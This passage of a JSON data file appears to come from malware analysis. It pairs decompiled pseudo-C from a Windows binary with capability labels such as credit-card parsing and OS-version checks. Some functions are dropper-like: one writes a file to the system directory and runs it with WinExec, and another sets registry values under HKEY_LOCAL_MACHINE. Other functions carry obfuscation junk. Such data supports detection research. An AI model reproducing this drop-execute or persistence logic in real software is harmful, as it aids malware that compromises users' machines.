1;\n}\n",
        "token_count": 960
    },
    "00402e20": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint fcn.00402e20(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    char **ppcVar6;\n    uint *puVar7;\n    char *pcVar8;\n    char *pcVar9;\n    char *pcVar10;\n    uint *puVar11;\n    uint uStack2112;\n    uint uStack2088;\n    char cStack2084;\n    uint uStack2083;\n    ushort uStack2079;\n    uchar uStack2077;\n    uchar uStack2064;\n    uint uStack2063;\n    uchar auStack1824 [12];\n    uchar auStack1812 [8];\n    uchar uStack1804;\n    uint uStack1803;\n    uchar auStack1564 [260];\n    char acStack1304 [20];\n    uchar auStack1284 [239];\n    char acStack1045 [21];\n    uchar uStack1024;\n    uint uStack1023;\n    \n    if (*0x423598 == 0) {\n        return 0;\n    }\n    uStack2088 = 0;\n    cStack2084 = '\\0';\n    uStack2083 = 0;\n    uStack2079 = 0;\n    uStack2077 = 0;\n    uStack2064 = 0;\n    puVar7 = &uStack2063;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1804 = 0;\n    puVar7 = &uStack1803;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1024 = 0;\n    puVar7 = &uStack1023;\n    for (iVar2 = 0xff; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    uStack2112 = 0x104;\n    *(puVar7 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(auStack1284);\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, auStack1812, 0x104);\n    fcn.004020b0(&uStack2112, 6);\n    (*_sym.imp.MSVCRT.dll_sprintf)(auStack1564, 0x4113d4, acStack1304, &uStack2112);\n    uStack2088 = 0x41145c;\n    ppcVar6 = &stack0xfffff7d0;\n    iVar2 = 3;\n    do {\n        uVar3 = 0xffffffff;\n        pcVar9 = &cStack2084;\n        do {\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar9 + 1;\n        } while (cVar1 != '\\0');\n        pcVar9 = *ppcVar6;\n        ppcVar6 = ppcVar6 + 1;\n        *(&uStack2088 + ~uVar3 + 3) = 10;\n        uVar3 = 0xffffffff;\n        do {\n            pcVar8 = pcVar9;\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            pcVar8 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar8;\n        } while (cVar1 != '\\0');\n        uVar3 = ~uVar3;\n        iVar4 = -1;\n        pcVar9 = &cStack2084;\n        do {\n            pcVar10 = pcVar9;\n            if (iVar4 == 0) break;\n            iVar4 = iVar4 + -1;\n            pcVar10 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar10;\n        } while (cVar1 != '\\0');\n        puVar7 = pcVar8 + -uVar3;\n        puVar11 = pcVar10 + -1;\n        for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n        iVar2 = iVar2 + -1;\n        for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n    } while (iVar2 != 0);\n    (*_sym.imp.MSVCRT.dll_sprintf)(acStack1045 + 1, &cStack2084, auStack1824, auStack1824, acStack1304[0]);\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    acStack1045[~uVar3] = '\\n';\n    uVar3 = 0xffffffff;\n    pcVar9 = 0x411474;\n    do {\n        pcVar8 = pcVar9;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar8 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar8;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    pcVar9 = acStack1045 + 1;\n    do {\n        pcVar10 = pcVar9;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        pcVar10 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar10;\n    } while (cVar1 != '\\0');\n    puVar7 = pcVar8 + -uVar3;\n    puVar11 = pcVar10 + -1;\n    for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    iVar2 = fcn.00401840(auStack1564, 0x4113d0, acStack1045 + 1, ~uVar3 - 1);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_WinExec)(auStack1564, 0);\n    return 1;\n}\n",
        "token_count": 1868
    },
    "00403130": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403704) overlaps instruction at (ram,0x00403703)\n// \n// WARNING: Removing unreachable block (ram,0x0040333b)\n// WARNING: Removing unreachable block (ram,0x004033ab)\n\nvoid fcn.00403130(void)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    uint8_t *puVar3;\n    uint32_t uVar4;\n    uint16_t extraout_CX;\n    int16_t extraout_CX_00;\n    int32_t extraout_ECX;\n    uint8_t uVar6;\n    int32_t extraout_ECX_00;\n    int32_t extraout_ECX_01;\n    uint32_t extraout_ECX_02;\n    int32_t extraout_ECX_03;\n    int32_t extraout_ECX_04;\n    int32_t iVar5;\n    int16_t extraout_DX;\n    char *pcVar7;\n    uint8_t *extraout_EDX;\n    uint8_t *extraout_EDX_00;\n    uint unaff_EBX;\n    uint *unaff_EBP;\n    uint *puVar8;\n    uint *puVar9;\n    int32_t *unaff_ESI;\n    int32_t *piVar10;\n    uint16_t uVar11;\n    uint8_t **unaff_EDI;\n    uint8_t **ppuVar12;\n    int32_t **ppiVar13;\n    ushort in_SS;\n    bool bVar14;\n    uchar uVar15;\n    uchar uVar16;\n    bool bVar17;\n    uint8_t in_AF;\n    char cVar18;\n    char cVar19;\n    ulong uVar20;\n    uint in_stack_ffffa161;\n    uint32_t in_stack_ffffa165;\n    uint8_t **arg_ch;\n    uint arg_14h;\n    int32_t *piVar21;\n    ushort uVar22;\n    ushort uVar23;\n    ushort uVar24;\n    ushort uVar25;\n    uint *apuStack7566 [1868];\n    uchar *puStack92;\n    uint uStack40;\n    uint uVar26;\n    \n    fcn.00403030(0x407014, 9, 0x411114, 10);\n    fcn.00403030(0x407014, 9, 0x411120, 0x12);\n    fcn.00403030(0x407014, 9, 0x411134, 4);\n    bVar14 = false;\n    uVar26 = 9;\n    fcn.00403030(0x407014, 9, 0x411138, 0xc);\n    if ((!bVar14) && (bVar14)) {\n        *(unaff_ESI + 0x43d1773a) = *(unaff_ESI + 0x43d1773a) ^ 0x6a27e95e;\n    }\n    puVar9 = &stack0xffffffe8;\n    uStack40 = 0x403220;\n    fcn.00403030(0x407014, 9, 0x411144, uVar26);\n    bVar14 = (extraout_DX - 1U & extraout_CX) == 0;\n    fcn.00403030(0x407014, 9, 0x41114c, 0xb);\n    puVar8 = unaff_EBP;\n    if ((!bVar14) && (bVar14)) {\n        cVar18 = '\\x10';\n        do {\n            unaff_EBP = unaff_EBP + -1;\n            puVar9 = puVar9 + -1;\n            *puVar9 = *unaff_EBP;\n            cVar18 = cVar18 + -1;\n            puVar8 = &stack0xffffffe8;\n            puStack92 = &stack0xffffffe8;\n        } while ('\\0' < cVar18);\n    }\n    fcn.00403030(0x407014, 9, 0x411158, 0xc);\n    fcn.00403030(0x407014, 9, 0x411164, 8);\n    fcn.00403030(0x407014, 9, 0x41116c, 0xd);\n    uVar11 = (unaff_EDI | 0x2fff) - unaff_EBX ^ 0x7174;\n    uVar15 = 0;\n    cVar19 = '\\0';\n    cVar18 = uVar11 < 0;\n    uVar16 = (POPCOUNT(uVar11 & 0xff) & 1U) == 0;\n    puVar3 = fcn.00403030(0x407014, 9, 0x41117c, 0x18);\n    ppuVar12 = unaff_EDI;\n    if ((cVar19 == cVar18) && (cVar19 != cVar18)) {\n        out(0xc4, puVar3);\n        ppuVar12 = unaff_EDI + 1;\n        *unaff_EDI = puVar3;\n        uVar6 = unaff_EBX >> 8;\n        uVar15 = uVar6 < *puVar3;\n        uVar16 = (POPCOUNT(uVar6 - *puVar3) & 1U) == 0;\n    }\n    uVar20 = fcn.00403030(0x407014, 9, 0x411194, 0x25);\n    if ((uVar15) || (!uVar15)) {\n        uVar4 = 0x403371;\n        uVar20 = fcn.00403030(0x407014, 9, 0x4111bc, 10);\n        puVar9 = puVar8;\n        piVar10 = unaff_ESI;\n        if (uVar16) goto code_r0x00403388;\n        in_stack_ffffa165 = uVar4 & 0xffff | unaff_ESI << 0x10;\n        iVar5 = extraout_ECX_00;\n    }\n    else {\n        puVar1 = uVar20 + 0x14;\n        *puVar1 = *puVar1 | puVar8;\n        iVar5 = extraout_ECX;\n    }\n    while( true ) {\n        pcVar7 = uVar20 >> 0x20;\n        uVar6 = iVar5 >> 8;\n        ppuVar12 = 0x7afffffc;\n        uVar4 = (uVar20 & 0xffffff00 | uVar20 + uVar6) + 0x5e665666 + CARRY1(uVar20, uVar6);\n        puVar9 = puVar8;\n        piVar10 = unaff_ESI;\n        if ((POPCOUNT(uVar4 & 0xff) & 1U) == 0) {\n            piVar10 = unaff_ESI + 1;\n            out(*unaff_ESI, uVar20 >> 0x20);\n            do {\n                cVar18 = uVar4 >> 8;\n                in_AF = 9 < (uVar4 & 0xf) | in_AF;\n                puVar9 = &stack0xffffe272;\n                uVar4 = CONCAT31(CONCAT21(uVar4 >> 0x10, cVar18 - in_AF), -in_AF);\n            } while (in_AF || cVar18 == *pcVar7);\n            piVar21 = pcVar7 * 2 + 0x7afffffc;\n            *piVar21 = (*piVar21 + 0x7b) - in_AF;\n            *(iVar5 + 0x6a) = uVar4;\n            apuStack7566[0] = puVar8;\n        }\n        else {\ncode_r0x00403388:\n            in_stack_ffffa165 = 0xc;\n            in_stack_ffffa161 = 0x4111c8;\n        }\n        uVar11 = fcn.00403030(0x407014, 9, in_stack_ffffa161, in_stack_ffffa165);\n        bVar14 = false;\n        bVar17 = (POPCOUNT(uVar11 & 0x59) & 1U) == 0;\n        fcn.00403030(0x407014, 9, 0x4111d4, 0xd);\n        if ((bVar17) || (!bVar17)) break;\n        puVar1 = segment(in_SS, *0x10 + -0x5e77);\n        if (bVar14) {\n            return;\n        }\n        if (!bVar17) break;\n        uVar20 = CONCAT44(0xb7bc9ea5, (*puVar1 & 0xffffff00 | *puVar1 + 'p' + bVar14) + 1);\n        iVar5 = extraout_ECX_01;\n        puVar8 = puVar9;\n        unaff_ESI = piVar10;\n    }\n    fcn.00403030(0x407014, 9, 0x4111e4, 6);\n    arg_ch = ppuVar12;\n    piVar21 = piVar10;\n    fcn.00403030(0x407014, 9, 0x4111ec, 5);\n    cVar18 = fcn.00403030(0x407014, 9, 0x4111f4, 0xd);\n    bVar14 = cVar18 + -1 < '\\0';\n    uVar24 = 0x1204;\n    uVar25 = 0x41;\n    uVar22 = 9;\n    uVar23 = 0;\n    uVar26 = 0x407014;\n    fcn.00403030(0x407014, 9, 0x411204, 0x19);\n    uVar4 = extraout_ECX_02;\n    if ((bVar14) || (uVar4 = extraout_ECX_02 & 0xffff,  !bVar14)) {\n        piVar21 = 0x9;\n    }\n    *extraout_EDX = *extraout_EDX & extraout_EDX;\n    puVar3 = extraout_EDX + 9;\n    uVar6 = uVar4 + 1 >> 8;\n    bVar14 = CARRY1(*puVar3, uVar6);\n    *puVar3 = *puVar3 + uVar6;\n    arg_14h = 0x40348d;\n    fcn.00403030(0x407014, uVar26, CONCAT22(uVar23, uVar22), CONCAT22(uVar25, uVar24));\n    if ((bVar14) || (!bVar14)) {\n        arg_14h = 0xe;\n        piVar21 = 0x411230;\n        arg_ch = 0x9;\n    }\n    ppiVar13 = ppuVar12 ^ *(ppuVar12 + 0xe58be73);\n    puVar3 = puVar9 + 0x680e6a76;\n    *extraout_EDX_00 = *extraout_EDX_00 ^ extraout_EDX_00;\n    extraout_EDX_00[9] = extraout_EDX_00[9] + (extraout_ECX_03 + 1 >> 8);\n    fcn.00403030(0x407014, arg_ch, piVar21, arg_14h);\n    fcn.00403030(0x407014, 9, 0x411240, 0xb);\n    fcn.00403030(0x407014, 9, 0x41124c, 0xb);\n    uVar22 = SUB42(puVar9, 0);\n    uVar23 = puVar9 >> 0x10;\n    fcn.00403030(0x407014, 9, 0x411258, 0xb);\n    fcn.00403030(0x407014, 9, 0x411264, 10);\n    fcn.00403030(0x407014, 9, 0x411270, 0xc);\n    fcn.00403030(0x407014, 9, 0x41127c, 0xe);\n    piVar21 = piVar10;\n    fcn.00403030(0x407014, 9, 0x41128c, 0x11);\n    uVar15 = 0;\n    uVar11 = ppiVar13;\n    cVar18 = uVar11 == 0;\n    do {\n        uVar24 = 0x3601;\n        uVar25 = 0x40;\n        fcn.00403030(0x407014, 9, 0x4112a0, 0x407014);\n        if ((uVar15) || (!uVar15)) {\n            uVar24 = 0x14;\n            uVar25 = 0;\n            uVar22 = 0x12b4;\n            uVar23 = 0x41;\n            piVar21 = 0x9;\n            iVar5 = extraout_ECX_04;\n            break;\n        }\n        iVar5 = extraout_ECX_04 + -1;\n    } while (iVar5 != 0 && cVar18 != '\\0');\n    iVar2 = *piVar10;\n    *ppiVar13 = piVar10 + 1;\n    pcVar7 = (iVar2 >> 0x1f) + 9;\n    *pcVar7 = *pcVar7 + (iVar5 + 1 >> 8);\n    fcn.00403030(0x407014, piVar21, CONCAT22(uVar23, uVar22), CONCAT22(uVar25, uVar24));\n    bVar14 = ((uVar11 | 0x2fff) - puVar3 ^ 0x7174) < 0;\n    uVar22 = 0x3666;\n    uVar23 = 0x40;\n    fcn.00403030(0x407014, 9, 0x4112c8, 0x33);\n    if ((bVar14) || (!bVar14)) {\n        uVar22 = 10;\n        uVar23 = 0;\n    }\n    *puVar3 = *puVar3 & 0xc3;\n    fcn.00403030(0x407014, 9, 0x4112fc, CONCAT22(uVar23, uVar22));\n    bVar14 = false;\n    bVar17 = (extraout_CX_00 - 1U & uVar11 | 0x61be) == 0;\n    uVar22 = 0x36aa;\n    uVar23 = 0x40;\n    uVar4 = fcn.00403030(0x407014, 9, 0x411308, 4);\n    if ((!bVar17) && (bVar17)) {\n        puVar3 = puVar9 + 0x680e6a77;\n        if (bVar14 || puVar3 == NULL) goto code_r0x00403703;\n        in_AF = 9 < (uVar4 & 0xf) | in_AF;\n        piVar10 = (uVar4 & 0xffff0000 | CONCAT11((uVar4 >> 8) + in_AF, uVar4 + in_AF * '\\x06') & 0xff0f) + 0x2a;\n        *piVar10 = *piVar10 - puVar3;\n    }\n    fcn.00403030(0x407014, 9, 0x41130c, 5);\n    bVar14 = (puVar3 >> 8) + '0' < '\\0';\n    uVar22 = 0x36f4;\n    uVar23 = 0x40;\n    fcn.00403030(0x407014, 9, 0x411314, 6);\n    if ((bVar14) || (!bVar14)) {\n        uVar22 = 0x2a;\n        uVar23 = 0;\n    }\n    else {\n        *puVar3 = *puVar3 & 0xc3;\n    }\ncode_r0x00403703:\n    fcn.00403030(0x407014, 9, 0x411348, CONCAT22(uVar23, uVar22));\n    fcn.00403030(0x407014, 9, 0x411374, 0xb);\n    return;\n}\n",
        "token_count": 3676
    },
    "00403b20": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302",
            "parse credit card information/330c87771d2c420b9aab664e2b442302",
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403d74) overlaps instruction at (ram,0x00403d72)\n// \n\nvoid fcn.00403b20(void)\n\n{\n    char *pcVar1;\n    char cVar2;\n    uint8_t uVar3;\n    uint16_t uVar4;\n    uint32_t uVar5;\n    uint8_t extraout_CH;\n    uint8_t extraout_DL;\n    uint16_t extraout_DX;\n    int32_t *piVar6;\n    int32_t extraout_EDX;\n    int32_t unaff_EBX;\n    int32_t iVar7;\n    uint unaff_ESI;\n    int32_t unaff_EDI;\n    uchar uVar8;\n    bool bVar9;\n    uint8_t in_AF;\n    uchar uVar10;\n    bool bVar11;\n    unkbyte10 extraout_ST0;\n    ulong uVar12;\n    int32_t arg_ch;\n    uint arg_14h;\n    uint uVar13;\n    uint uVar14;\n    uint uVar15;\n    \n    fcn.00403030(0x407014, 9, 0x41147c, 0x20);\n    fcn.00403030(0x407014, 9, 0x41149c, 0x26);\n    fcn.00403030(0x407014, 9, 0x4114c4, 8);\n    uVar12 = fcn.00403030(0x407014, 9, 0x4114cc, 0x19);\n    piVar6 = uVar12 >> 0x20;\n    *(uVar12 + -0x7ce92414) = extraout_ST0;\n    in_AF = 9 < (uVar12 - 1U & 0xf) | in_AF;\n    *piVar6 = *piVar6 + 0xb6adf84;\n    fcn.00403030(0x407014, 9, 0x4114e8, unaff_EBX);\n    arg_ch = unaff_EDI;\n    fcn.00403030(0x407014, 9, 0x4114f4, 0x12);\n    cVar2 = fcn.00403030(0x407014, 9, 0x411508, 0x12);\n    bVar9 = (POPCOUNT((cVar2 + 1) - 1 & 0x7b) & 1U) == 0;\n    uVar15 = 0x41151c;\n    uVar14 = 9;\n    uVar13 = 0x407014;\n    fcn.00403030(0x407014, 9, 0x41151c, 2);\n    if ((bVar9) || (!bVar9)) {\n        unaff_ESI = 9;\n    }\n    iVar7 = *0x6a17b43a;\n    *(extraout_EDX + 0x21) = *(extraout_EDX + 0x21) | extraout_CH;\n    bVar9 = extraout_EDX + 0x96a0042 < 0;\n    arg_14h = 0x403c8c;\n    fcn.00403030(0x407014, uVar13, uVar14, uVar15);\n    if ((bVar9) || (!bVar9)) {\n        arg_14h = 8;\n        unaff_ESI = 0x411528;\n        arg_ch = 9;\n    }\n    fcn.00403030(0x407014, arg_ch, unaff_ESI, arg_14h);\n    uVar8 = false;\n    uVar10 = (extraout_DL & unaff_EBX) == 0;\n    uVar14 = 0x411530;\n    uVar13 = 9;\n    fcn.00403030(0x407014, 9, 0x411530, 6);\n    if ((!uVar8) && (uVar8)) {\n        uVar8 = 0;\n        *0x787ae42e = *0x787ae42e ^ 0x6a27e95e;\n        uVar10 = *0x787ae42e == 0;\n    }\n    uVar15 = 9;\n    fcn.00403030(0x407014, 9, 0x411538, uVar13);\n    if ((!uVar8 && !uVar10) && (uVar8 || uVar10)) {\n        *(unaff_EDI + 0x6a) = *(unaff_EDI + 0x6a) - &stack0xffffffec;\n    }\n    uVar4 = fcn.00403030(0x407014, 9, 0x411540, uVar15);\n    bVar9 = (((uVar4 & 0xff | (uVar4 >> 8 & extraout_DX >> 8) << 8) * 2 | extraout_DX) ^ 0x6c00 ^ unaff_EBX) < 0;\n    uVar15 = 0x403d66;\n    uVar5 = fcn.00403030(0x407014, 9, 0x411548, 6);\n    if ((bVar9) || (!bVar9)) {\n        uVar15 = 0x25;\n        uVar14 = 0x411550;\n        uVar13 = 9;\n    }\n    bVar9 = 0xf695ffbe < uVar5 + 0x5068256a || CARRY4(uVar5 + 0x59d225ab, 0xaf97da95 < uVar5);\n    bVar11 = uVar5 + 0x59d225ab + (0xaf97da95 < uVar5) == 0;\n    uVar5 = fcn.00403030(0x407014, uVar13, uVar14, uVar15);\n    if ((!bVar11) && (bVar11)) {\n        uVar3 = uVar5;\n        if (bVar9 || unaff_EBX + 1 == 0) {\n            pcVar1 = iVar7 + 0x5f0775c0;\n            *pcVar1 = *pcVar1 + uVar3 + bVar9;\n            return;\n        }\n        in_AF = 9 < (uVar3 & 0xf) | in_AF;\n        piVar6 = (uVar5 & 0xffff0000 | CONCAT11((uVar5 >> 8) + in_AF, uVar3 + in_AF * '\\x06') & 0xff0f) + 0x2a;\n        *piVar6 = *piVar6 - (unaff_EBX + 1);\n    }\n    fcn.00403030(0x407014, 9, 0x411578, 8);\n    return;\n}\n",
        "token_count": 1536
    },
    "00401410": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nchar * __cdecl fcn.00401410(char *arg_8h, int32_t arg_ch, char *arg_10h, int32_t arg_14h)\n\n{\n    int32_t iVar1;\n    char *pcVar2;\n    char *pcVar3;\n    char *pcVar4;\n    bool bVar5;\n    \n    pcVar3 = arg_8h + (arg_ch - arg_14h);\n    if (arg_14h == 0) {\n        return arg_8h;\n    }\n    if (arg_8h <= pcVar3) {\n        do {\n            if (*arg_8h == *arg_10h) {\n                bVar5 = true;\n                iVar1 = arg_14h;\n                pcVar2 = arg_8h;\n                pcVar4 = arg_10h;\n                do {\n                    pcVar4 = pcVar4 + 1;\n                    pcVar2 = pcVar2 + 1;\n                    iVar1 = iVar1 + -1;\n                    if (iVar1 == 0) break;\n                    bVar5 = *pcVar2 == *pcVar4;\n                } while (bVar5);\n                if (bVar5) {\n                    return arg_8h;\n                }\n            }\n            arg_8h = arg_8h + 1;\n        } while (arg_8h <= pcVar3);\n    }\n    return NULL;\n}\n",
        "token_count": 306
    },
    "00401840": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401840(uint filename, uint mode, uint ptr, uint nitems)\n\n{\n    int32_t iVar1;\n    ushort uVar2;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_fopen)(filename, mode);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    uVar2 = iVar1;\n    (*_sym.imp.MSVCRT.dll_fwrite)(ptr, 1, nitems, uVar2);\n    (*_sym.imp.MSVCRT.dll_fflush)(uVar2);\n    (*_sym.imp.MSVCRT.dll_fclose)(uVar2);\n    return 1;\n}\n",
        "token_count": 148
    },
    "00401590": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004015e5) overlaps instruction at (ram,0x004015e4)\n// \n\nuint fcn.00401590(void)\n\n{\n    uint lpVersionInformation;\n    int32_t var_90h;\n    int32_t var_8ch;\n    \n    lpVersionInformation = 0x94;\n    (*_sym.imp.KERNEL32.dll_GetVersionExA)(&lpVersionInformation);\n    if (var_90h == 5) {\n        return 1;\n    }\n    if ((5 < var_90h) && (var_90h < 6)) {\n        if (!SBORROW4(var_90h, 5)) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    if ((var_90h == 6) && (var_8ch == 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 238
    },
    "00401950": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401950(char *arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    char *pcVar6;\n    uchar var_268h;\n    uint var_267h;\n    char var_164h;\n    uint var_163h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    char *var_4ch;\n    char *var_48h;\n    uint *var_44h;\n    uint *var_40h;\n    uint *var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar2 = _sym.imp.MSVCRT.dll_sprintf;\n    var_268h = 0;\n    puVar5 = &var_267h;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_164h = '\\0';\n    puVar5 = &var_163h;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_8h = 1;\n    var_4h = 0;\n    var_ch = 1;\n    var_10h = arg_ch != 0;\n    (*_sym.imp.MSVCRT.dll_sprintf)(&var_164h, 0x41117c, arg_8h);\n    (*pcVar2)(&var_268h, 0x411194, arg_8h);\n    pcVar2 = _sym.imp.SHLWAPI.dll_SHSetValueA;\n    var_44h = &var_8h;\n    var_40h = &var_4h;\n    uVar4 = 0xffffffff;\n    pcVar6 = &var_164h;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar1 != '\\0');\n    var_24h = ~uVar4 - 1;\n    uVar4 = 0xffffffff;\n    pcVar6 = arg_8h;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar1 != '\\0');\n    var_4ch = &var_164h;\n    var_38h = 0x4111bc;\n    var_34h = 0x4111c8;\n    var_30h = 0x4111d4;\n    var_2ch = 0x4111e4;\n    var_28h = 0x4111ec;\n    var_60h = 2;\n    var_5ch = 1;\n    var_58h = 4;\n    var_54h = 4;\n    var_50h = 4;\n    var_48h = arg_8h;\n    var_3ch = &var_ch;\n    var_20h = ~uVar4 - 1;\n    var_1ch = 4;\n    var_18h = 4;\n    var_14h = 4;\n    if (var_10h < 5) {\n        uVar4 = var_10h * 4;\n        do {\n            iVar3 = (*pcVar2)(0x80000002, &var_268h, *(&var_38h + uVar4), *(&var_60h + uVar4), *(&var_4ch + uVar4), \n                              *(&var_24h + uVar4));\n            if (iVar3 != 0) {\n                return 0;\n            }\n            uVar4 = uVar4 + 4;\n        } while (uVar4 < 0x14);\n    }\n    return 1;\n}\n",
        "token_count": 1109
    },
    "004021e0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint32_t fcn.004021e0(void)\n\n{\n    int32_t iVar1;\n    uint uStack12;\n    uint32_t uStack8;\n    uchar auStack4 [4];\n    \n    uStack12 = 4;\n    iVar1 = fcn.00402120(0x80000002, 0x4112c8, 0x411314, auStack4, &uStack8, &uStack12);\n    if ((iVar1 == 0) || (5 < uStack8)) {\n        uStack8 = 0xffffffff;\n    }\n    return uStack8;\n}\n",
        "token_count": 133
    },
    "00403f50": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403fc3) overlaps instruction at (ram,0x00403fbf)\n// \n// WARNING: Variable defined which should be unmapped: lpdwResult\n// WARNING: Removing unreachable block (ram,0x00404414)\n// WARNING: Removing unreachable block (ram,0x004042d8)\n// WARNING: Removing unreachable block (ram,0x00404358)\n// WARNING: Removing unreachable block (ram,0x004041b1)\n// WARNING: Removing unreachable block (ram,0x004041cc)\n// WARNING: Removing unreachable block (ram,0x004043fb)\n// WARNING: Removing unreachable block (ram,0x004041d4)\n// WARNING: Removing unreachable block (ram,0x004041e8)\n// WARNING: Removing unreachable block (ram,0x004041fc)\n// WARNING: Removing unreachable block (ram,0x00404234)\n// WARNING: Removing unreachable block (ram,0x0040425f)\n// WARNING: Removing unreachable block (ram,0x00404284)\n// WARNING: Removing unreachable block (ram,0x004043cf)\n// WARNING: Removing unreachable block (ram,0x004043d7)\n// WARNING: Removing unreachable block (ram,0x004043dd)\n// WARNING: Removing unreachable block (ram,0x0040428c)\n// WARNING: Removing unreachable block (ram,0x0040437f)\n// WARNING: Removing unreachable block (ram,0x0040438a)\n// WARNING: Removing unreachable block (ram,0x00404390)\n// WARNING: Removing unreachable block (ram,0x0040439b)\n// WARNING: Removing unreachable block (ram,0x004043e8)\n// WARNING: Removing unreachable block (ram,0x004043ee)\n// WARNING: Removing unreachable block (ram,0x004042a0)\n// WARNING: Removing unreachable block (ram,0x004042da)\n// WARNING: Removing unreachable block (ram,0x004042ed)\n// WARNING: Removing unreachable block (ram,0x004042ef)\n// WARNING: Removing unreachable block (ram,0x0040439d)\n// WARNING: Removing unreachable block (ram,0x004043bc)\n// WARNING: Removing unreachable block (ram,0x004043c2)\n// WARNING: Removing unreachable block (ram,0x004043cd)\n// WARNING: Removing unreachable block (ram,0x00404403)\n// WARNING: Removing unreachable block (ram,0x00404409)\n// WARNING: Removing 